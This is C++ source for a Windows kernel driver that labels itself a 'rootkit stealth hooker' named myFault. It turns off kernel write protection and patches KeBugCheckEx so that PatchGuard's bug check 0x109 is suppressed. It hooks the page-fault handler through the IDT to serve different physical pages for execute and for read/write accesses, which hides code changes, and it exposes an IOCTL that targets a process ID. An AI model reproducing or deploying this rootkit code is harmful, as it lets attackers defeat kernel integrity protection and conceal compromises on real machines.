//DONT FORGET TO NULL THE PTE AFTER LOADING IT INTO THE TLB
extern "C"{
	#include "API.cpp"

	//defined
	static ULONG ThreadStartRoutineOffset = 0;
	PVOID OrigKeBugCheckExRestorePointer;
	PVOID OrigKiPageFaultRestorePointer;
	BOOLEAN KiPageFaultHook(UINT64 err, UINT64 ip);
	//extern "C" PVOID KeBugCheckExHookPointer = KeBugCheckExHook;
	
	VOID AdjustStackCallPointer(IN ULONG_PTR NewStackPointer, IN PVOID StartAddress, IN PVOID Argument);
	VOID OrigKeBugCheckEx(IN ULONG BugCheckCode, IN ULONG_PTR BugCheckParameter1, IN ULONG_PTR BugCheckParameter2, IN ULONG_PTR BugCheckParameter3, IN ULONG_PTR BugCheckParameter4);
	VOID OrigKiPageFault();
}
using namespace std;

UINT16 location[4];
VOID(*test)() = NULL;

//push 42424242h
//mov dword ptr[rsp + 4], 42424242h
//ret
static CHAR HookStub[] = "\x68\x42\x42\x42\x42\xc7\x44\x24\x04\x42\x42\x42\x42\xc3";

BOOLEAN hooked = FALSE;

VOID KeBugCheckExHook(IN ULONG BugCheckCode, IN ULONG_PTR BugCheckParameter1, IN ULONG_PTR BugCheckParameter2, IN ULONG_PTR BugCheckParameter3, IN ULONG_PTR BugCheckParameter4){
	PUCHAR LockedAddress;
	PCHAR  ReturnAddress;
	PMDL   Mdl = NULL;

	// Call the real KeBugCheckEx if this isn't the bug check code we're looking for.
	if (BugCheckCode != 0x109){
		DbgPrint("	Passing through bug check %.4x to %p.", BugCheckCode, OrigKeBugCheckEx);

		OrigKeBugCheckEx(BugCheckCode, BugCheckParameter1, BugCheckParameter2, BugCheckParameter3, BugCheckParameter4);
	}else{
		PCHAR CurrentThread = (PCHAR)PsGetCurrentThread();
		PVOID StartRoutine = *(PVOID **)(CurrentThread + ThreadStartRoutineOffset);
		PVOID StackPointer = IoGetInitialStack();

		DbgPrint("	Restarting the current worker thread %p at %p (SP=%p, off=%lu).",  PsGetCurrentThread(), StartRoutine, StackPointer, ThreadStartRoutineOffset);

		// Shift the stack pointer back to its initial value and call the routine.  We
		// subtract eight to ensure that the stack is aligned properly as thread
		// entry point routines would expect.
		AdjustStackCallPointer((ULONG_PTR)StackPointer - 0x8, StartRoutine, NULL);
	}

	// In either case, we should never get here.
	__debugbreak();
}
VOID HotPatchThread(IN PVOID Nothing);
PVOID resolveSymbol(PCWSTR sym){
	UNICODE_STRING SymbolName;
	RtlInitUnicodeString(&SymbolName, sym);
	return MmGetSystemRoutineAddress(&SymbolName);
}
PVOID HotPatch(PCHAR addy, UINT64 hook, UINT8 length){
	NTSTATUS       Status = STATUS_SUCCESS;
	PUCHAR         LockedAddress;
	PMDL           Mdl = NULL;
	PVOID		   OrigRestorePointer = NULL;
	PUCHAR         CurrentThread = (PUCHAR)PsGetCurrentThread();

	do{
		//Find the thread's start routine offset.
		for (ThreadStartRoutineOffset = 0; ThreadStartRoutineOffset < 0x1000; ThreadStartRoutineOffset += 4){
			if (*(PVOID**)(CurrentThread + ThreadStartRoutineOffset) == (PVOID)HotPatchThread) break;
		}

		DbgPrint("		Thread start routine offset is 0x%.4x.\n", ThreadStartRoutineOffset);

		//If we failed to find the start routine offset for some strange reason, then return not supported.
		if (ThreadStartRoutineOffset >= 0x1000){
			Status = STATUS_NOT_SUPPORTED;
			DbgPrint("		STATUS_NOT_SUPPORTED\n");
			break;
		}

		//Calculate the restoration pointer.
		OrigRestorePointer = (PVOID)(addy + length);

		//Create an initialize the MDL.
		if (!(Mdl = MmCreateMdl(NULL, addy, length))){
			Status = STATUS_INSUFFICIENT_RESOURCES;
			DbgPrint("		STATUS_INSUFFICIENT_RESOURCES\n");
			break;
		}

		MmBuildMdlForNonPagedPool(Mdl);

		//Probe & Lock.
		if (!(LockedAddress = (PUCHAR)MmMapLockedPages(Mdl, KernelMode))){
			IoFreeMdl(Mdl);
			Status = STATUS_ACCESS_VIOLATION;
			DbgPrint("		STATUS_ACCESS_VIOLATION\n");
			break;
		}

		// Set the aboslute address to our hook.
		*(PUINT32)(HookStub + 1) = (UINT32)hook;
		*(PUINT32)(HookStub + 9) = (UINT32)(hook >> 32);

		DbgPrint("		Copying hook stub to %p from %p (Symbol %p).\n", LockedAddress, HookStub, addy);

		//Copy the relative jmp into the hook routine.
		RtlCopyMemory(LockedAddress, HookStub, length);

		//Cleanup the MDL
		MmUnmapLockedPages(LockedAddress, Mdl);
		IoFreeMdl(Mdl);
	} while (0);
	return OrigRestorePointer;
}
VOID HotPatchThread(IN PVOID Nothing){
	DbgPrint("	Patching kernel:\n");
	//temporarily disable CR0 bit 16 write protect
	UINT64 cr0 = __readcr0();
	__writecr0(cr0 &= ~(1 << 16));

	OrigKeBugCheckExRestorePointer = HotPatch((PCHAR)resolveSymbol(L"KeBugCheckEx"), (ULONG64)KeBugCheckExHook, 15);
	OrigKiPageFaultRestorePointer = HotPatch((PCHAR)*(PUINT64)location, (ULONG64)OrigKiPageFault, 16);

	__writecr0(cr0 |= 1 << 16);

	hooked = TRUE;
	DbgPrint("	Kernel patched!\n");
}
NTSTATUS Patch() {
	OBJECT_ATTRIBUTES Attributes;
	NTSTATUS          Status;
	HANDLE            ThreadHandle = NULL;

	InitializeObjectAttributes(&Attributes, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

	//Create the system worker thread so that we can automatically find the offset inside the ETHREAD structure to the thread's start routine.
	Status = PsCreateSystemThread(&ThreadHandle, THREAD_ALL_ACCESS, &Attributes, NULL, NULL, HotPatchThread, NULL);

	if (ThreadHandle){
		while (hooked == FALSE){
			LARGE_INTEGER interval;
			interval.QuadPart = 10000000;
			KeDelayExecutionThread(KernelMode, FALSE, &interval);
		}
		ZwClose(ThreadHandle);
	}

	return Status;
}

BOOLEAN KiPageFaultHook(UINT64 error, UINT64 rip){
	UINT64 cr2 = __readcr2();

	//check if the page is hooked
	UINT64 hookIndex = isHooked(__readcr3(), cr2);
	if (hookIndex == -1) return 0; //let the real handler take over

	PPTE pte = MiGetPteAddress(cr2);

	//is execute?
	if (rip == cr2){
		DbgPrint("	Handling an execute access on %llx.\n", cr2);
		_disable();
		PTE savePTE = *pte;
		pte->PageFrameNumber = hookedPages[hookIndex].executePFN;
		pte->Valid = 1;
		//call into the page to reload it in the ITLB
		VOID(*test)() = (VOID(*)())(hookedPages[hookIndex].voidCall);
		test();
		//restore the original PTE 
		*pte = savePTE;
		_enable();
		return 1;
	}

	//it must be readwrite
	DbgPrint("	Handling a read/write access from %llx.\n", rip);
	_disable();
	PTE savePTE = *pte;
	//is read write coming from within the page?
	if (((UINT64)MiGetVirtualAddressMappedByPte(pte) <= rip) && (rip < (UINT64)MiGetVirtualAddressMappedByPte(pte) + 0x1000)){
		pte->PageFrameNumber = hookedPages[hookIndex].executePFN;
		DbgPrint("	internal execute access? :o\n");
	}
	else{
		pte->PageFrameNumber = hookedPages[hookIndex].readWritePFN;
	}
	//reload the DTLB
	pte->Valid = 1;
	//UINT64 temp = *(PUINT64)cr2;
	reloadDTLB();
	//*pte = savePTE;

	//reloadITLB
	pte->PageFrameNumber = hookedPages[hookIndex].executePFN;
	//call into the page to reload it in the ITLB
	//test = (VOID(*)())(hookedPages[hookIndex].voidCall);
	//test();
	//restore the original PTE 
	*pte = savePTE;


	//just something to get the mov to compile  (need to write this in pure asm later)
	//the iretq task switch seems to be a problem
	//DbgPrint("	Testing read: %llx\n", temp);
	_enable();
	return 1;
}

VOID OnUnload(IN PDRIVER_OBJECT pDriverObject){
	UNICODE_STRING puDeviceLink;
	RtlInitUnicodeString(&puDeviceLink, L"\\DosDevices\\myFault");
	IoDeleteSymbolicLink(&puDeviceLink);
	IoDeleteDevice(pDriverObject->DeviceObject);
	DbgPrint("	Unloading... Need to unhook the kernel, but for now lets just crash the system. :)\n");
	return;
}

NTSTATUS IOCTL(IN PDEVICE_OBJECT DeviceObject, IN PIRP irp){
	NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
	PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(irp);
	UINT32 code = irpStack->Parameters.DeviceIoControl.IoControlCode;
	
	if (code == CTL_CODE(FILE_DEVICE_UNKNOWN, 0xF42, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)) {
		UINT64 pid = *(PUINT64)irp->AssociatedIrp.SystemBuffer;
		DbgPrint("	Testing on PID: %d\n", pid);
		test42(pid);
		ntStatus = STATUS_SUCCESS;
	}

	irp->IoStatus.Status = ntStatus;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return ntStatus;
}

NTSTATUS DispatchCreate(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp){
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return Irp->IoStatus.Status;
}

extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT  pDriverObject, IN PUNICODE_STRING RegistryPath){
	__debugbreak();
	DbgPrint("\n _____________________________________________________\n");
	DbgPrint("|'._________________________________________________.'|\n");
	DbgPrint("| |                                                 | |\n");
	DbgPrint("| |                     myFault                     | |\n");
	DbgPrint("| |     A rootkit stealth hooker from Forty-Two     | |\n");
	DbgPrint("| |                                                 | |\n");
	DbgPrint("| | Don't forget to invlpg at the end of your hook! | |\n");
	DbgPrint("'.|_________________________________________________|.'\n\n");

	//Register the unload routine
	pDriverObject->DriverUnload = OnUnload;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IOCTL;
	pDriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;

	//Initalize the device name
	UNICODE_STRING puDeviceName;
	RtlInitUnicodeString(&puDeviceName, L"\\Device\\myFault");
	UNICODE_STRING puDeviceLink;
	RtlInitUnicodeString(&puDeviceLink, L"\\DosDevices\\myFault");

	//Create the device   
	PDEVICE_OBJECT pDeviceObject = {0};
	NTSTATUS Status = IoCreateDevice(pDriverObject, 0, &puDeviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &pDeviceObject);
	Status = IoCreateSymbolicLink(&puDeviceLink, &puDeviceName);
	if (STATUS_SUCCESS != Status) return Status;
	DbgPrint("	Kernel device created successully.\n");

	UINT64 idt = 0xffff000000000000;
	idt = GIDT(idt);
	DbgPrint("	IDT is at %llx\n", idt);

	//get the address of nt!PageFault
	*(location) = *((PUINT16)idt + 8 * 0x0E);
	*(location + 1) = *((PUINT16)idt + 8 * 0x0E + 3);
	*(location + 2) = *((PUINT16)idt + 8 * 0x0E + 4);
	*(location + 3) = *((PUINT16)idt + 8 * 0x0E + 5);
	DbgPrint("	Trap 0x0E is at %llx\n", location);
	
	//DbgPrint("Enabling global pages in CR4\n");
	//UINT64 cr4 = __readcr4();
	//__writecr4(cr4 |= 1 << 7);

	Patch();

	DbgPrint("	ASDF: %llx", PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)notify, 0));

	DbgPrint("	Exiting Driver Entry......\n");
	return STATUS_SUCCESS;
}
